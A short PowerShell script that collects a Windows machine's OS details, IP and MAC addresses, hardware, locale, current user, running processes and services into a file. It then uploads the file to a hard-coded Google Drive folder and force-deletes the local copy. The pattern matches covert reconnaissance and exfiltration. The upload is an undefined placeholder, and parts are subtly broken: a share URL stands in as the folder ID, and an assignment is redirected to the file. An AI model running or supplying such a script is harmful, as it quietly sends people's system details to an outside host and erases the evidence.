# Google Drive Configuration (Replace with your actual details)
$googleDriveFolderId = "https://drive.google.com/drive/folders/1IlASN8C4ocFjCmLwagRQxagDHwb9ZbNx?usp=drive_link" 

# Output File Path
$outputFilePath = "$env:USERPROFILE\Downloads\output_filename.txt"

# Gather System Information
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsName, OsManufacturer, CsName | Out-File -FilePath $outputFilePath
Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength >> $outputFilePath
Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress, Status >> $outputFilePath
Get-WmiObject -Class Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors >> $outputFilePath
Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum >> $outputFilePath
Get-WmiObject -Class Win32_DiskDrive | Select-Object Model, Size, MediaType >> $outputFilePath
Get-WinHomeLocation >> $outputFilePath
Get-WinSystemLocale >> $outputFilePath
$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()) >> $outputFilePath
$currentUser.Identity.Name >> $outputFilePath
Get-Process >> $outputFilePath
Get-Service >> $outputFilePath

# Upload the Results to Google Drive
try {
    # Implement your Google Drive upload logic here
    # Example (using a hypothetical function):
    Upload-FileToGoogleDrive -FilePath $outputFilePath -FolderId $googleDriveFolderId
} catch {
    Write-Error "Error uploading results to Google Drive: $($_.Exception.Message)"
} finally {
    # Delete the output file after upload (successful or not)
    Remove-Item -Path $outputFilePath -Force
}